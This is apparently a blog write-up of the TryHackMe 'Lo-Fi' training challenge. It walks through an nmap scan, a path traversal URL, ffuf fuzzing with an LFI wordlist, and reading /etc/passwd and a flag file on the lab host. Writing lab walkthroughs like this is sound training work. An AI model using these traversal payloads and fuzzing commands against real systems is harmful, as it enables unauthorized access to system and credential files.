---
title: TryHackMe - Lo-Fi
author: rene
description: A basic guide to exploiting 🗂️ Local File Inclusion and Path Traversal vulnerabilities in this challenge. #
categories: [TryHackMe]
tags: [web, local file inclusion, path traversal]     # TAG names should always be lowercase
render_with_liquid: false
image:
    path: /images/tryhackme_lofi/room_image.png
---

This should be simple LFI / Path Traversal vulnerability practice challenge.

[![Tryhackme Room Link](/images/tryhackme_lofi/room_card.png){: width="300" height="300" .shadow}](https://tryhackme.com/room/lofi){: .center }

Let's start with nmap scan

```
nmap -T4 -n -sC -sV -Pn -p- 10.10.72.5
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 40:ed:13:25:88:c7:cc:8b:86:8f:8b:0d:74:04:07:c7 (RSA)
|   256 c4:90:3d:98:c3:1d:87:c2:ca:15:f7:6f:10:f1:19:5f (ECDSA)
|_  256 18:ff:a7:d6:2d:bc:5c:ae:e2:bc:54:3f:20:c6:1a:81 (ED25519)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Lo-Fi Music
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`80/tcp` port open, let's visit the website

Let's start by Path Traversal
```
http://10.10.72.5/?page=/../../../flag.txt
```

No Luck, but we know the site is vulnerable

![Hacker Message](/images/tryhackme_lofi/attempt1.png){: width="600" height="450" .shadow}

Let's try this parameter against some wordlist using `ffuf`
```console
ffuf -w /usr/share/wordlists/LFI-Jhaddix.txt -u "http://10.10.72.5/?page=FUZZ" -fl 124
```

### Breakdown:

- `-w /usr/share/wordlists/LFI-Jhaddix.txt` → Uses a wordlist containing common LFI payloads.
- `-u "http://10.10.72.5/?page=FUZZ"` → Replaces `FUZZ` in the URL with each word from the wordlist.
- `-fl 124` → Filters out responses with **124 lines**, ignoring them to focus on different results.

We've got some hits

![ffuf Output](/images/tryhackme_lofi/ffuf.png){: width="600" height="450" .shadow}

Let's try a few of the simplest ones using /etc/passwd file

Success

![Traversal Path](/images/tryhackme_lofi/traversal.png){: width="600" height="450" .shadow}

Now let's try it using flag.txt file

![Flag](/images/tryhackme_lofi/flag.png){: width="600" height="450" .shadow}











---

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
</style>